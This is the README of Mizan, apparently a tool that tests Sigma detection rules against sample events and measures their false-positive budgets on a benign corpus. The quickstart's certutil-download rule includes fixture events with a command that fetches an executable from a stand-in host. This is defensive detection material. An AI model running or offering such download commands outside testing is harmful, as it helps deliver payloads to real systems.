# Mizan

Mizan is a gate for detection rules: a Sigma rule enters a rule set only
with evidence. Every rule ships with events it must match, events it must
not match, and a declared false-positive budget that is measured on a
benign corpus. Mizan is deterministic (no model, no score), works offline,
and needs only Python 3.11+ and PyYAML. Nothing is green by default.

Status: v0.1 on branch `mizan` of this repository (branch `main` is Raqib,
a different project). Doctrine: `docs/CONSTITUTION.md`; design:
`docs/specs/ADR-0001-architecture.md`; how it can be fooled:
`docs/THREAT_MODEL.md`.

## Quickstart

```sh
git clone --branch mizan https://github.com/omanras/raqib mizan
cd mizan
tools/gate.sh                 # the repository gates itself: tests + example set
```

Write a rule with its two sidecars (`<name>.yml`, `<name>.positive.jsonl`,
`<name>.negative.jsonl`), one JSON event per line:

```sh
mkdir -p myrules
cat > myrules/win_certutil_download.yml <<'EOF'
title: certutil used to download a file
id: 8c1d2e3f-4a5b-4c6d-8e7f-9a0b1c2d3e4f
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains|all:
      - '-urlcache'
      - 'http'
  condition: selection
level: high
x-mizan:
  fp_budget: 0
EOF
cat > myrules/win_certutil_download.positive.jsonl <<'EOF'
{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe"}
{"Image": "C:\\Windows\\SysWOW64\\CERTUTIL.EXE", "CommandLine": "certutil -URLCache -f https://203.0.113.5/x.txt"}
EOF
cat > myrules/win_certutil_download.negative.jsonl <<'EOF'
{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f c:\\temp\\a.cer"}
{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -verify my.cer"}
EOF
python3 -m mizan test myrules/win_certutil_download.yml
python3 -m mizan check myrules/ --corpus corpus/
```

`test` judges the rule by its sidecars and cites every line. `check` adds
the budget: the rule is measured on every corpus file whose declared
logsource agrees with the rule's (here `corpus/windows-process_creation.jsonl`,
1,000 synthetic benign events), and the set is green only if every rule
passes and stays within budget. The transcript of this quickstart from a
fresh clone is in `docs/review/2026-10-17-M2.2-quickstart.md`.

## Commands

| Command | What it does | Green (exit 0) when |
| --- | --- | --- |
| `python3 -m mizan check [RULES_DIR] [--corpus DIR] [--json]` | fixtures + budget for every `*.yml` under the directory (recursive); red rules first | every rule is `pass` and within budget |
| `python3 -m mizan test RULE.yml [--json]` | judge one rule by its sidecars | the rule is `pass` |
| `python3 -m mizan match RULE.yml EVENTS.jsonl [--json]` | run one rule over a JSON Lines file; lists matching and `unknown` lines | every line was judged |
| `python3 -m mizan corpus [RULES_DIR] [--corpus DIR] [--json]` | false-positive rate per rule: `<status> <id> fp/10k=<n> budget=<b> events=<e>` | every rule within budget |
| `python3 -m mizan export RULE.yml --target splunk\|elastic [--json]` | convert a rule through pySigma (optional dependency) | a query was produced |

Defaults: `RULES_DIR` is `rules/`, the corpus is `corpus/`. Text output is
one line per rule, `<status> <id> <title>`, then indented citations
`<file>:<line> <reason>`; JSON output is
`{"version": 1, "rules": [...], "green": bool}` (`export --json` prints
`{"target", "query", "backend_version"}`).

## Statuses and exit codes

| Status | Meaning |
| --- | --- |
| `pass` | every positive line matches, no negative line matches, within budget |
| `fail` | a positive line did not match or a negative line matched (cited), or a sidecar is missing or empty (A2) |
| `invalid` | the rule file did not load: not YAML, not a mapping, a required field missing or wrong (each named) |
| `unknown` | Mizan could not judge: an unsupported modifier or condition, a malformed fixture or corpus line, a file over the limits (A4) -- `unknown` is red |
| `over_budget` | fp/10k on the benign corpus is above `x-mizan.fp_budget` |
| `no_corpus` | no corpus file is compatible with the rule's logsource (or a file named in `x-mizan.corpus` is missing) |

Exit codes: `0` green, `1` red, `2` usage error, `3` could not complete (a
rule or events path unreadable, a corpus file without a valid header or with
an unparseable line, a missing corpus directory) -- 3 is also red.

## Rule format

A Sigma rule (one YAML document) with `title`, `id` (UUID), `logsource`
(at least one of `product`, `category`, `service`), `detection` (with
`condition` and at least one selection), `level`
(`informational|low|medium|high|critical`) and the Mizan extension:

```yaml
x-mizan:
  fp_budget: 10          # matches allowed per 10,000 benign events of the logsource
  corpus:                # optional: measure on these files instead of by logsource
    - windows-process_creation.jsonl
```

Other Sigma fields are kept and ignored. Duplicate YAML keys, several
documents in one file and files over 1 MiB are `invalid`.

Corpus files are `corpus/<name>.jsonl`: a first line
`{"_mizan": {"logsource": {"product": "windows", "category": "process_creation"}}}`,
then one benign JSON event per line (lines up to 1 MiB, files up to 256
MiB). `tools/make_corpus.py` regenerates the three synthetic example
corpora from a fixed seed.

## Supported Sigma subset

- Selections: a mapping (AND across fields; a list of values is OR, or AND
  with `|all`) or a list of strings (keyword search over every string value
  anywhere in the event, nested objects and arrays included).
- Comparison: case-insensitive; `*` and `?` wildcards; a backslash escapes
  `*`, `?` and `\`; event values that are not strings compare as their JSON
  text; `field: null` matches an absent or null field; the exact field name
  first, then a dotted path through nested objects (`a.b.c`).
- Modifiers: `contains`, `startswith`, `endswith`, `all`, `re` (Python
  `re.search`, case-sensitive unless `|re|i`), `exists`, `gt`, `gte`, `lt`,
  `lte` (numbers, including numeric strings), `cidr` (IPv4/IPv6), `windash`
  (`-` also matches `/`).
- Condition: identifiers, `and`, `or`, `not`, parentheses, `1 of X*`,
  `all of X*`, `1 of them`, `all of them`; precedence `not` > `and` > `or`.

Everything else is `unknown`, never a silent guess: any other modifier
(`base64`, `utf16le`, `expand`, `fieldref`, `cased`, `re|m`, `re|s`, ...),
aggregations (`| count() ...`), `near`, other quantifiers (`2 of`), a
wildcard that is not trailing in a pattern, a list of mappings as a
selection, uppercase keywords, a `condition` given as a list, a regular
expression Python cannot compile. A rule that uses an unsupported feature
in a selection its condition references is `unknown` on every event.

## Export (optional)

`python3 -m mizan export RULE.yml --target splunk|elastic` converts a rule
to a target query through pySigma. It needs
`pip install pysigma pysigma-backend-splunk pysigma-backend-elasticsearch`;
without them the command exits 3 and prints that line. Only
`mizan/export.py` imports pySigma; `check`, `test`, `match` and `corpus`
never do and make no network call.

## Layout

`mizan/` the package (loader, matcher, condition, fixtures, corpus, report,
cli, export) -- `rules/` ten synthetic example rules with sidecars --
`corpus/` three synthetic benign corpora -- `tools/` `gate.sh`,
`make_corpus.py`, `next-task.sh` -- `tests/` -- `docs/` constitution, ADR,
development plan, threat model, handoffs and review notes.
